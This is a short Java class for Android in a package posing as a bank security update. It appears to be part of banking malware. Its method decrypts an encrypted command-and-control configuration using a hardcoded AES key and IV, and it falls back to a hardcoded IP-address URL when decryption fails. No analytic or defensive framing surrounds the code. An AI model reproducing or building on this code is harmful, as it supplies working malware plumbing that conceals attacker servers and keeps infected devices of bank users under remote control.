package com.bank.security.update;

import android.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class CryptoHelper {
    private static final String KEY = "1234567890123456";
    private static final String IV  = "abcdefghijklmnop";

    public static String decryptC2Config(String encryptedBase64) {
        try {
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            SecretKeySpec keySpec = new SecretKeySpec(KEY.getBytes("UTF-8"), "AES");
            IvParameterSpec ivSpec = new IvParameterSpec(IV.getBytes("UTF-8"));
            cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);

            byte[] decodedBytes = Base64.decode(encryptedBase64, Base64.DEFAULT);
            byte[] decrypted = cipher.doFinal(decodedBytes);
            return new String(decrypted, "UTF-8");
        } catch (Exception e) {
            return "http://185.220.101.5/fallback";
        }
    }
}
